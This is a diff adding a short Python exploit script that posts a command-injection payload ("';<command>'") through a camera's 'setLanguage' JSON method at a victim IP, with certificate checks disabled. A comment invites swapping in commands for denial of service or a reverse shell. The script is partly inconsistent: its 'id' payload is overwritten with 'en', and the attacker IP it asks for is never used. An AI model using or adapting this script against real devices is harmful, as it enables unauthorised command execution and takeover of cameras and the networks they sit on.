@@ -1,0 +1,33 @@
+import requests
+import urllib3
+import sys
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+if len(sys.argv) != 3:
+    print("Usage: python3 exploit.py <camera_ip> <attacker_ip>")
+    sys.exit(1)
+
+victim_ip = sys.argv[1]
+attacker_ip = sys.argv[2]
+
+# Simple reboot payload - replace with other commands for DoS or reverse shell
+payload = "id"
+
+payload = "en"
+json_data = {
+    "method": "setLanguage",
+    "params": {
+        "payload": f"';{payload}'"
+    }
+}
+
+url = f"https://{victim_ip}:443/"
+
+print(f"[+] Sending payload: {payload}")
+try:
+    response = requests.post(url, json=json_data, verify=False, timeout=5)
+    print(f"[+] Response Code: {response.status_code}")
+    print(f"[+] Response Text: {response.text}")
+except Exception as e:
+    print(f"[!] Error: {e}")
